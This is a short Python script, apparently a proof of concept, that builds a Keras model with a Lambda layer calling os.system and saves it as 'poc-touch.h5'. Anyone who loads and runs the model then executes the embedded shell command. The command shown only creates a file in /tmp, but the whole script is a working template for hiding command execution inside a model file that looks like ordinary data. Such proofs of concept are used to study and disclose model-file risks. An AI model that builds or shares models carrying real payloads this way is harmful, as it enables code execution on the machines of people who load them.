import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

def payload(x):
    import os
    os.system("touch /tmp/poc_touch")
    return x



model = keras.Sequential([
    layers.Input(shape=(1,)),
    layers.Lambda(payload)
])



model.save("poc-touch.h5")
